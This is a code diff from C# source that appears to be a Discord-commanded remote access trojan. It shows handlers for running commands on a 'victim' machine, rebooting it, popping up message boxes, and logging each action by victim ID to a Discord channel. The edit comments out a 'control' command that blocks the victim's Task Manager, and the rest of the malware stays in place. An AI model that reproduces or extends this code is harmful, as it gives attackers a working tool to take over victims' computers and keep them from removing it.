@@ -232,10 +232,10 @@ class Program
             await HandleCMDCommand(userMessage, args[1]);
         }
 
-        if (command == Settings.prefix + "control" && userMessage.Channel.Id == victimChannel.Id)
-        {
-            await HandleControlCommand(userMessage, args[1]);
-        }
+        //if (command == Settings.prefix + "control" && userMessage.Channel.Id == victimChannel.Id)
+        //{
+        //    await HandleControlCommand(userMessage, args[1]);
+        //}
 
         if (command == Settings.prefix + "boot" && userMessage.Channel.Id == victimChannel.Id)
         {
@@ -369,18 +369,18 @@ Commands below works only in victim channel
         Environment.Exit(-1);
     }
 
-    private async Task HandleControlCommand(SocketUserMessage userMessage, string access)
-    {
-        var guild = client.GetGuild(Settings.guildId);
-        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
-
-        if (access == "block")
-        {
-            await Utils.Taskmgr();
-            await logsChannel.SendMessageAsync($"Successfully blocked victim '{victimId}' | By {userMessage.Author.Mention}");
-            await victimChannel.SendMessageAsync($"blocked victim '{victimId}' | By {userMessage.Author.Mention}");
-        }
-    }
+    //private async Task HandleControlCommand(SocketUserMessage userMessage, string access)
+    //{
+    //    var guild = client.GetGuild(Settings.guildId);
+    //    var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
+    //
+    //    if (access == "block")
+    //    {
+    //        await Utils.Taskmgr();
+    //        await logsChannel.SendMessageAsync($"Successfully blocked victim '{victimId}' | By {userMessage.Author.Mention}");
+    //        await victimChannel.SendMessageAsync($"blocked victim '{victimId}' | By {userMessage.Author.Mention}");
+    //    }
+    //}
 
     private async Task HandleMsgBoxCommand(SocketUserMessage userMessage, string text, string caption)
     {
